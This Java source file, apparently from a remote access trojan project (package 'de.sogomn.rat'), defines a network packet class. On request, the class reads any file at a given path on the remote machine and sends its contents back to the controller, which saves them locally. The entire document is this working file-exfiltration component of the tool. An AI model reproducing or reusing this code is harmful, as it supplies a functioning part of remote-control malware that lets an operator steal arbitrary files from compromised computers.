/*
 * Copyright 2016 Johannes Boczek
 */

package de.sogomn.rat.packet;

import java.io.File;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.ActiveConnection;

public final class DownloadFilePacket extends AbstractPingPongPacket {
	
	private String path;
	
	private byte[] data;
	private String fileName;
	
	public DownloadFilePacket(final String path) {
		this.path = path;
		
		type = REQUEST;
	}
	
	public DownloadFilePacket() {
		this("");
		
		type = DATA;
	}
	
	@Override
	protected void sendRequest(final ActiveConnection connection) {
		connection.writeUtf(path);
	}
	
	@Override
	protected void sendData(final ActiveConnection connection) {
		connection.writeInt(data.length);
		connection.write(data);
		connection.writeUtf(fileName);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection connection) {
		path = connection.readUtf();
	}
	
	@Override
	protected void receiveData(final ActiveConnection connection) {
		final int length = connection.readInt();
		
		data = new byte[length];
		connection.read(data);
		fileName = connection.readUtf();
		
	}
	
	@Override
	protected void executeRequest(final ActiveConnection connection) {
		final File file = new File(path);
		
		if (file.exists() && !file.isDirectory()) {
			fileName = file.getName();
			data = FileUtils.readExternalData(path);
			type = DATA;
			
			connection.addPacket(this);
		}
	}
	
	@Override
	protected void executeData(final ActiveConnection connection) {
		FileUtils.writeData(fileName, data);
	}
	
	public String getFileName() {
		return fileName;
	}
	
}
